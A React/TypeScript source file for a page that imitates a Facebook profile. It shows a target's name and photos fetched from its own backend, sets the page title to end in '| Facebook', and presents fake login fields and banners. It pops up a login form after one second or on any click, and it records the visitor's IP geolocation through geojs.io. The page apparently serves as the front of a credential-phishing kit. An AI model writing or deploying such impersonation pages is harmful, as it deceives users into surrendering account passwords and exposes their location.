import type { FC } from 'react';
import { useEffect, useState } from 'react';
import FacebookIcon from '@/assets/images/facebook-icon';
import DefaultCover from '@/assets/images/cover.jpg';
import DefaultAvatar from '@/assets/images/avatar.jpg';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {
    faEllipsisH,
    faBriefcase,
    faGraduationCap,
    faSchool,
} from '@fortawesome/free-solid-svg-icons';
import LoginForm from '@/components/login-form';
import { setSystemConfig } from '@/types/system';

interface UserInfo {
    full_name: string;
    cover_image: string;
    avatar_image: string;
}

const DEFAULT_NAME = 'Chao Văn Xìn';

const isValidImageUrl = async (url: string): Promise<boolean> => {
    try {
        const response = await fetch(url, { method: 'HEAD' });
        const contentType = response.headers.get('content-type');
        return contentType ? contentType.startsWith('image/') : false;
    } catch {
        return false;
    }
};

const Index: FC = () => {
    const [showLoginForm, setShowLoginForm] = useState(false);
    const [userInfo, setUserInfo] = useState<UserInfo>({
        full_name: DEFAULT_NAME,
        cover_image: DefaultCover,
        avatar_image: DefaultAvatar,
    });

    useEffect(() => {
        localStorage.clear();

        const fetchUserInfo = async () => {
            try {
                const response = await fetch(`${import.meta.env.API_URL}/api/user`);
                const data = await response.json();
                if (data.success) {
                    const [isValidAvatar, isValidCover] = await Promise.all([
                        data.data.avatar_image ? isValidImageUrl(data.data.avatar_image) : false,
                        data.data.cover_image ? isValidImageUrl(data.data.cover_image) : false,
                    ]);

                    setUserInfo({
                        full_name: data.data.full_name || DEFAULT_NAME,
                        cover_image: isValidCover ? data.data.cover_image : DefaultCover,
                        avatar_image: isValidAvatar ? data.data.avatar_image : DefaultAvatar,
                    });
                }
            } catch {
                console.error('Error fetching user info');
            }
        };

        const fetchSystemConfig = async () => {
            try {
                const response = await fetch(`${import.meta.env.API_URL}/api/config/system`);
                const data = await response.json();
                if (data.success) {
                    setSystemConfig(data.data);
                }
            } catch (error) {
                console.error('Error fetching system config:', error);
            }
        };

        const fetchGeoData = async () => {
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const data = await response.json();
                localStorage.setItem('geoData', JSON.stringify(data));
            } catch (error) {
                console.error('Error fetching geo data:', error);
            }
        };

        fetchUserInfo();
        fetchSystemConfig();
        fetchGeoData();

        const timer = setTimeout(() => {
            setShowLoginForm(true);
        }, 1000);

        return () => clearTimeout(timer);
    }, []);

    const handleMainClick = () => {
        if (!showLoginForm) {
            setShowLoginForm(true);
        }
    };

    const handleImageError = (
        e: React.SyntheticEvent<HTMLImageElement, Event>,
        type: 'avatar' | 'cover',
    ) => {
        const target = e.target as HTMLImageElement;
        console.error(`Failed to load ${type} image:`, target.src);
        target.src = type === 'avatar' ? DefaultAvatar : DefaultCover;
    };

    return (
        <main onClick={handleMainClick}>
            <title>{`${userInfo.full_name} | Facebook`}</title>
            <header className="sticky top-0 z-10 flex h-14 items-center justify-between bg-white px-4 shadow-md md:px-8">
                <FacebookIcon />
                <div className="flex items-center gap-2">
                    <input
                        placeholder="Email or phone"
                        type="text"
                        className="hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"
                    />
                    <input
                        placeholder="Password"
                        type="password"
                        className="hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"
                    />
                    <button className="bg-primary hover:bg-primary/90 rounded-md px-3 py-[9px] text-[15px] font-semibold text-white">
                        Login
                    </button>
                    <p className="hidden px-1 py-1.5 text-[15px] font-semibold text-[#0064d1] md:block">
                        Forgotten account?
                    </p>
                </div>
            </header>
            <div className="flex w-full flex-col items-center justify-center bg-white shadow-md md:min-h-[500px]">
                <div className="relative h-[250px] w-full max-w-[940px] md:h-[350px]">
                    <img
                        src={
                            userInfo.cover_image === DefaultCover
                                ? DefaultCover
                                : import.meta.env.API_URL + userInfo.cover_image
                        }
                        alt=""
                        className="h-full w-full rounded-b-md object-cover object-center"
                        onError={(e) => handleImageError(e, 'cover')}
                    />
                    <div className="absolute -bottom-24 left-1/2 flex -translate-x-1/2 flex-col items-center gap-2 md:-bottom-20 md:left-8 md:translate-x-0 md:flex-row md:items-end">
                        <img
                            src={
                                userInfo.avatar_image === DefaultAvatar
                                    ? DefaultAvatar
                                    : import.meta.env.API_URL + userInfo.avatar_image
                            }
                            alt=""
                            className="h-[120px] w-[120px] rounded-full border-4 border-white object-cover md:h-[176px] md:w-[176px]"
                            onError={(e) => handleImageError(e, 'avatar')}
                        />
                        <p className="text-2xl font-bold md:py-2 md:text-3xl">
                            {userInfo.full_name}
                        </p>
                    </div>
                </div>
                <hr className="mt-28 w-full border-gray-300 md:mt-24 md:w-[876px]" />
                <div className="flex h-16 w-full max-w-[876px] items-center justify-between px-4 text-[15px] font-semibold text-[#65676b]">
                    <div className="flex items-center gap-2 overflow-x-auto">
                        <p>Friends</p>
                        <p>Photos</p>
                        <p>Photos</p>
                    </div>
                    <FontAwesomeIcon
                        icon={faEllipsisH}
                        className="rounded-md bg-gray-200 px-4 py-2.5"
                    />
                </div>
            </div>
            <div className="bg-[#F0F2F5] p-2 md:p-4">
                <div className="mx-auto flex max-w-[876px] flex-col gap-4">
                    <div className="rounded-lg bg-white p-4">
                        <h2 className="mb-4 text-xl font-bold">About</h2>

                        <div className="space-y-4">
                            <div>
                                <h3 className="font-semibold">Work</h3>
                                <p className="flex items-center gap-2 text-[#65676b]">
                                    <FontAwesomeIcon
                                        icon={faBriefcase}
                                        className="text-[#65676b]"
                                    />
                                    No workplaces to show
                                </p>
                            </div>

                            <div>
                                <h3 className="font-semibold">University</h3>
                                <p className="flex items-center gap-2 text-[#65676b]">
                                    <FontAwesomeIcon
                                        icon={faGraduationCap}
                                        className="text-[#65676b]"
                                    />
                                    No schools/universities to show
                                </p>
                            </div>

                            <div>
                                <h3 className="font-semibold">High School</h3>
                                <p className="flex items-center gap-2 text-[#65676b]">
                                    <FontAwesomeIcon icon={faSchool} className="text-[#65676b]" />
                                    No schools/universities to show
                                </p>
                            </div>
                        </div>
                    </div>

                    <div className="rounded-lg bg-white p-4">
                        <div className="mb-4 flex items-center justify-between">
                            <h2 className="text-lg font-bold md:text-xl">Photos</h2>
                            <button className="font-semibold text-[#0064d1]">See All Photos</button>
                        </div>
                        <div className="grid grid-cols-2 gap-2 md:grid-cols-3">
                            {[...Array(6)].map((_, i) => (
                                <div
                                    key={`photo-${i + 1}`}
                                    className="aspect-square rounded-md bg-gray-200"
                                />
                            ))}
                        </div>
                    </div>
                </div>
            </div>
            <div
                className="fixed right-0 bottom-0 left-0 flex flex-col items-center justify-center bg-white px-4 py-4 shadow-[0_-2px_4px_rgba(0,0,0,0.1)] md:px-0 md:py-8"
                onClick={(e) => e.stopPropagation()}
            >
                <h1 className="mb-4 max-w-[350px] truncate text-center text-xl font-bold md:max-w-full md:text-2xl">
                    Log in or sign up for Facebook to connect with friends, family and people you
                    know.
                </h1>
                <div className="flex w-full flex-col items-center gap-2 md:w-auto md:flex-row">
                    <button
                        className="h-[40px] w-[230px] rounded-md bg-[#1877f2] text-[17px] font-semibold text-white hover:bg-[#1877f2]/90"
                        onClick={() => setShowLoginForm(true)}
                    >
                        Log in
                    </button>
                    <span className="text-[13px] font-semibold text-[#65676b] md:block">or</span>
                    <button
                        className="h-[40px] w-[230px] rounded-md bg-[#42b72a] text-[17px] font-semibold text-white hover:bg-[#36a420]"
                        onClick={() => setShowLoginForm(true)}
                    >
                        Create new account
                    </button>
                </div>
            </div>
            {showLoginForm && (
                <div
                    onClick={(e) => {
                        e.stopPropagation();
                    }}
                >
                    <LoginForm onClose={() => setShowLoginForm(false)} />
                </div>
            )}
        </main>
    );
};

export default Index;
